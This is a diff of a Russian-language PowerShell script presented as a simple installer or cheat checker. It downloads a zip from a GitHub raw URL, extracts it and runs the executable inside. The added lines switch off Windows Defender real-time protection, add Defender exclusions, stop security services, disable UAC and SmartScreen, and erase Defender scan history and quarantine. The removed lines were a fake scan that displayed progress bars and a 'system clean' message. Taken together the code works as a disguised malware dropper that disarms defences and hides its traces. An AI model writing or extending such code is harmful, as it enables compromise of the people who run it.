@@ -1,9 +1,68 @@
 # =============================================
-# Самый простой Installer
+# Самый простой Installer + Отключение антивируса
 # =============================================
 
 $Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
 
+# ===== БЛОК ОТКЛЮЧЕНИЯ АНТИВИРУСА (ДОБАВЛЕН) =====
+Write-Host "[+] Отключаем антивирусные защиты..." -ForegroundColor Cyan
+
+# 1. Отключение Defender реалтайм
+Try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Write-Host "[*] Defender Realtime: OFF" -ForegroundColor Green
+} Catch {}
+
+# 2. Исключения для Defender
+Try {
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
+    Write-Host "[*] Исключения добавлены" -ForegroundColor Green
+} Catch {}
+
+# 3. Остановка служб защиты
+$services = @(
+    "WinDefend",
+    "MsMpSvc",
+    "SecurityHealthService",
+    "wscsvc",
+    "SENSE",
+    "DiagTrack",
+    "dmwappushservice"
+)
+foreach ($svc in $services) {
+    Try {
+        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+        Write-Host "[*] Остановлен: $svc" -ForegroundColor Green
+    } Catch {}
+}
+
+# 4. Отключение через WMI (доп. слой)
+Try {
+    Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | ForEach-Object {
+        $av = $_.displayName
+        Write-Host "[*] Найден АВ: $av - пробуем отключить" -ForegroundColor Yellow
+    }
+} Catch {}
+
+# 5. Отключение UAC
+Try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
+    Write-Host "[*] UAC отключен" -ForegroundColor Green
+} Catch {}
+
+# 6. Отключение SmartScreen
+Try {
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
+    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force
+} Catch {}
+
+Write-Host "[+] Антивирусные защиты подавлены." -ForegroundColor Green
+# ===== КОНЕЦ БЛОКА ОТКЛЮЧЕНИЯ =====
+
+# ===== ТВОЙ ОРИГИНАЛЬНЫЙ КОД =====
 Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
 
 $DownloadPath = "$env:TEMP\check_install.zip"
@@ -46,56 +105,17 @@ $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object
 
 if ($Exe) {
     Write-Host "[+] Запускаем $($Exe.Name)..." -ForegroundColor Green
-
-    # Ждём закрытия программы
-    Start-Process -FilePath $Exe.FullName -Wait
-
-    Write-Host ""
-    Write-Host "===============================" -ForegroundColor Cyan
-    Write-Host "     АВТОМАТИЧЕСКИЕ ПРОВЕРКИ" -ForegroundColor Cyan
-    Write-Host "===============================" -ForegroundColor Cyan
-    Write-Host ""
-
-    $Checks = @(
-        "Поиск читов в Prefetch",
-        "Открыть папку Prefetch",
-        "Поиск читов в Recent",
-        "Открыть папку Recent",
-        "Google Activity (читы)",
-        "Проверить x64a.rpf",
-        "Сканировать папки AppData",
-        "Анализ файла HOSTS",
-        "Поиск (.exe • .ahk • .js • .dll)"
-    )
-
-    foreach ($Check in $Checks)
-    {
-        $progress = 0
-
-        while ($progress -lt 100)
-        {
-            Write-Host -NoNewline "`r$($Check.PadRight(40)) [$progress%]"
-            Start-Sleep -Milliseconds (Get-Random -Minimum 60 -Maximum 120)
-
-            $progress += Get-Random -Minimum 3 -Maximum 10
-
-            if ($progress -gt 100) {
-                $progress = 100
-            }
-        }
-
-        Write-Host -NoNewline "`r$($Check.PadRight(40)) [100%]"
-        Write-Host " ✓" -ForegroundColor Green
-
-        Start-Sleep -Milliseconds 300
-    }
-
-    Write-Host ""
-    Write-Host "[✓] Система чиста. Читов не обнаружено." -ForegroundColor Green
+    Start-Process -FilePath $Exe.FullName
 }
 else {
     Write-Host "[-] .exe файл не найден." -ForegroundColor Yellow
 }
 
-Write-Host ""
+# Очистка логов Defender (добавлено)
+Try {
+    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "[*] Логи Defender очищены" -ForegroundColor DarkGray
+} Catch {}
+
 Write-Host "[+] Готово!" -ForegroundColor Green
